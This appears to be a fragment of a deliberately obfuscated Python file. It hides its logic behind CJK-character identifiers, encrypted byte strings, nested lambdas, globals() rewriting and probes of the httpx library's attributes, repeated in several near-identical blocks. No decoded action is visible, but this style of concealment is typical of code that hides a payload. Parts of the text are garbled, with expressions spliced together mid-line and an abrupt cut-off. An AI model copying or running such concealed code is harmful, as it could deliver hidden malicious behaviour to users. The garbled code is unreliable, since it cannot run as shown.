            globals()[(lambda: (lambda: (lambda: 雘訡衋筿仺癖(濼颤鳴鼂錙讟(疤啥瘈箚楧忶(躹鐗渃菧驛倕, [(lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xf8'))()]))))())())()] = [[[[[(lambda: (lambda: (lambda: 雘訡衋筿仺癖(濼颤鳴鼂錙讟(疤啥瘈箚楧忶(躹鐗渃菧驛倕, [(lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x07'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x00'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x08'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xfc'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x0e'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x12'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xfe'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x07'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xfc'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x08'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xfd'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xfe'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x0b'))()]))))())())() * (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/:\xdeh\xb1'))()] * (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/:\xdeh\xb1'))()] * (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/:\xdeh\xb1'))()] * (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/:\xdeh\xb1'))()] * (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/:\xdeh\xb1'))()] * (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/~\x8ah\xc0'))() * (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/~\x8ah\xc0'))()

try:
    match '蛬堰佚曜书衁' == '逑茨鲍鄩欛夙':
        case True:
            raise 燪汼钞嘜嘑飶()
        case False:
            偄鴄轲岬曥拉 = [[True], [False]]
            暽掇財豥硿淳(['别骷澈鈗較呲'])
    raise 燪汼钞嘜嘑飶()
except 燪汼钞嘜嘑飶 as 俭竏綱樂爫覢:
    try:
        match (lambda: (lambda: (lambda: 雘訡衋筿仺癖(濼颤鳴鼂錙讟(疤啥瘈箚楧忶(躹鐗渃菧驛倕lambda: (lambda: (lambda: 雘訡衋筿仺癖(濼颤鳴鼂錙讟(疤啥瘈箚楧忶(躹鐗渃菧驛倕
            case True:
                raise 燪汼钞嘜嘑飶()
            case False:
                峎颭掖淟驗偗 = [[(lambda: (lambda 蛐堀恞退樾藞: 蛐堀恞退樾藞 + (lambda: 趄诖狗谦頠鮳(309485009821345068724781056))())(0) == 1)()], [(lambda: (lambda 蠯裭晰袌掋凤: 蠯裭晰袌掋凤 - (lambda: 趄诖狗谦頠鮳(309485009821345068724781056))())(0) == 1)()]]
                暽掇財豥硿淳([(lambda: (lambda: (lambda: 雘訡衋筿仺癖(濼颤鳴鼂錙讟(疤啥瘈箚楧忶(躹鐗渃菧驛倕
        raise 燪汼钞嘜嘑飶()
    except 燪汼钞嘜嘑飶 as 隕霛呪覲蟆榃:
        try:
            __import__('httpx').patch
        except AttributeError:
            globals()[(lambda: (lambda: (lambda: 雘訡衋筿仺癖(濼颤鳴鼂錙讟(疤啥瘈箚楧忶(躹鐗渃菧驛倕, [(lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xf8'))()]))))())())()] = [[[[[(lambda: (lambda: (lambda: 雘訡衋筿仺癖(濼颤鳴鼂錙讟(疤啥瘈箚楧忶(躹鐗渃菧驛倕, [(lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x07'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x00'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x08'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xfc'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x0e'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x12'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xfe'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x07'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xfc'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x08'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xfd'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xfe'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x0b'))()]))))())())() * (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/:\xdeh\xb1'))()] * (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/:\xdeh\xb1'))()] * (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/:\xdeh\xb1'))()] * (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/:\xdeh\xb1'))()] * (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/:\xdeh\xb1'))()] * (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/~\x8ah\xc0'))() * (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/~\x8ah\xc0'))()
try:
    match '蛬堰佚曜书衁' == '逑茨鲍鄩欛夙':
        case True:
            raise 燪汼钞嘜嘑飶()
        case False:
            偄鴄轲岬曥拉 = [[True], [False]]
            暽掇財豥硿淳(['别骷澈鈗較呲'])
    raise 燪汼钞嘜嘑飶()
except 燪汼钞嘜嘑飶 as 俭竏綱樂爫覢:
    try:
        match (lambda: (lambda: (lambda: 雘訡衋筿仺癖(濼颤鳴鼂錙讟(疤啥瘈箚楧忶(躹鐗渃菧驛倕, [3333333333333333333333333333333333333333333333333333333333242422222222222222222722254495, 3333333333333333333333333333333333333333333333333333333333242422222222222222222722244886, 3333333333333333333333333333333333333333333333333333333333242422222222222222222722252035, 3333333333333333333333333333333333333333333333333333333333242422222222222222222722245588, 3333333333333333333333333333333333333333333333333333333333242422222222222222222722248784, 3333333333333333333333333333333333333333333333333333333333242422222222222222222722242434]))))())())() == (lambda: (lambda: (lambda: 雘訡衋筿仺癖(濼颤鳴鼂錙讟(疤啥瘈箚楧忶(躹鐗渃菧驛倕
            case True:
                raise 燪汼钞嘜嘑飶()
            case False:
                峎颭掖淟驗偗 = [[(lambda: (lambda 蛐堀恞退樾藞: 蛐堀恞退樾藞 + (lambda: 趄诖狗谦頠鮳(309485009821345068724781056))())(0) == 1)()], [(lambda: (lambda 蠯裭晰袌掋凤: 蠯裭晰袌掋凤 - (lambda: 趄诖狗谦頠鮳(309485009821345068724781056))())(0) == 1)()]]
                暽掇財豥硿淳([(lambda: (lambda: (lambda: 雘訡衋筿仺癖(濼颤鳴鼂錙讟(疤啥瘈箚楧忶(躹鐗渃菧驛倕
        raise 燪汼钞嘜嘑飶()
    except 燪汼钞嘜嘑飶 as 隕霛呪覲蟆榃:
        try:
            __import__('httpx').stream
        except AttributeError:
            globals()[(lambda: (lambda: (lambda: 雘訡衋筿仺癖(濼颤鳴鼂錙讟(疤啥瘈箚楧忶(躹鐗渃菧驛倕, [(lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xf8'))()]))))())())()] = [[[[[(lambda: (lambda: (lambda: 雘訡衋筿仺癖(濼颤鳴鼂錙讟(疤啥瘈箚楧忶(躹鐗渃菧驛倕, [(lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x07'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x00'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x08'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xfc'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x0e'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x12'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xfe'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x07'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xfc'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x08'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xfd'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xfe'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x0b'))()]))))())())() * (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/:\xdeh\xb1'))()] * (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/:\xdeh\xb1'))()] * (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/:\xdeh\xb1'))()] * (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/:\xdeh\xb1'))()] * (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/:\xdeh\xb1'))()] * (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/~\x8ah\xc0'))() * (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/~\x8ah\xc0'))()

try:
    match '蛬堰佚曜书衁' == '逑茨鲍鄩欛夙':
        case True:
            raise 燪汼钞嘜嘑飶()
        case False:
            偄鴄轲岬曥拉 = [[True], [False]]
            暽掇財豥硿淳(['别骷澈鈗較呲'])
    raise 燪汼钞嘜嘑飶()
except 燪汼钞嘜嘑飶 as 俭竏綱樂爫覢:
    try:
        match (lambda: (lambda: (lambda: 雘訡衋筿仺癖(濼颤鳴鼂錙讟(疤啥瘈箚楧忶(躹鐗渃菧驛倕lambda: (lambda: (lambda: 雘訡衋筿仺癖(濼颤鳴鼂錙讟(疤啥瘈箚楧忶(躹鐗渃菧驛倕
            case True:
                raise 燪汼钞嘜嘑飶()
            case False:
                峎颭掖淟驗偗 = [[(lambda: (lambda 蛐堀恞退樾藞: 蛐堀恞退樾藞 + (lambda: 趄诖狗谦頠鮳(309485009821345068724781056))())(0) == 1)()], [(lambda: (lambda 蠯裭晰袌掋凤: 蠯裭晰袌掋凤 - (lambda: 趄诖狗谦頠鮳(309485009821345068724781056))())(0) == 1)()]]
                暽掇財豥硿淳([(lambda: (lambda: (lambda: 雘訡衋筿仺癖(濼颤鳴鼂錙讟(疤啥瘈箚楧忶(躹鐗渃菧驛倕
        raise 燪汼钞嘜嘑飶()
    except 燪汼钞嘜嘑飶 as 隕霛呪覲蟆榃:
        try:
            __import__('httpx')._auth
        except AttributeError:
            globals()[(lambda: (lambda: (lambda: 雘訡衋筿仺癖(濼颤鳴鼂錙讟(疤啥瘈箚楧忶(躹鐗渃菧驛倕, [(lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xf8'))()]))))())())()] = [[[[[(lambda: (lambda: (lambda: 雘訡衋筿仺癖(濼颤鳴鼂錙讟(疤啥瘈箚楧忶(躹鐗渃菧驛倕, [(lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x07'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x00'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x08'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xfc'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x0e'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x12'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xfe'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x07'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xfc'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x08'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xfd'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xfe'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x0b'))()]))))())())() * (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/:\xdeh\xb1'))()] * (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/:\xdeh\xb1'))()] * (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/:\xdeh\xb1'))()] * (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/:\xdeh\xb1'))()] * (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/:\xdeh\xb1'))()] * (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/~\x8ah\xc0'))() * (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/~\x8ah\xc0'))()
try:
    match '蛬堰佚曜书衁' == '逑茨鲍鄩欛夙':
        case True:
            raise 燪汼钞嘜嘑飶()
        case False:
            偄鴄轲岬曥拉 = [[True], [False]]
            暽掇財豥硿淳(['别骷澈鈗較呲'])
    raise 燪汼钞嘜嘑飶()
except 燪汼钞嘜嘑飶 as 俭竏綱樂爫覢:
    try:
        match (lambda: (lambda: (lambda: 雘訡衋筿仺癖(濼颤鳴鼂錙讟(疤啥瘈箚楧忶(躹鐗渃菧驛倕lambda: (lambda: (lambda: 雘訡衋筿仺癖(濼颤鳴鼂錙讟(疤啥瘈箚楧忶(躹鐗渃菧驛倕
            case True:
                raise 燪汼钞嘜嘑飶()
            case False:
                峎颭掖淟驗偗 = [[(lambda: (lambda 蛐堀恞退樾藞: 蛐堀恞退樾藞 + (lambda: 趄诖狗谦頠鮳(309485009821345068724781056))())(0) == 1)()], [(lambda: (lambda 蠯裭晰袌掋凤: 蠯裭晰袌掋凤 - (lambda: 趄诖狗谦頠鮳(309485009821345068724781056))())(0) == 1)()]]
                暽掇財豥硿淳([(lambda: (lambda: (lambda: 雘訡衋筿仺癖(濼颤鳴鼂錙讟(疤啥瘈箚楧忶(躹鐗渃菧驛倕
        raise 燪汼钞嘜嘑飶()
    except 燪汼钞嘜嘑飶 as 隕霛呪覲蟆榃:
        try:
            __import__('httpx')._api
        except AttributeError:
            globals()[(lambda: (lambda: (lambda: 雘訡衋筿仺癖(濼颤鳴鼂錙讟(疤啥瘈箚楧忶(躹鐗渃菧驛倕, [(lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xf8'))()]))))())())()] = [[[[[(lambda: (lambda: (lambda: 雘訡衋筿仺癖(濼颤鳴鼂錙讟(疤啥瘈箚楧忶(躹鐗渃菧驛倕, [(lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x07'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x00'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x08'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xfc'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x0e'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x12'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xfe'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x07'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xfc'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x08'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xfd'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xfe'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x0b'))()]))))())())() * (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/:\xdeh\xb1'))()] * (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/:\xdeh\xb1'))()] * (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/:\xdeh\xb1'))()] * (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/:\xdeh\xb1'))()] * (lambda: 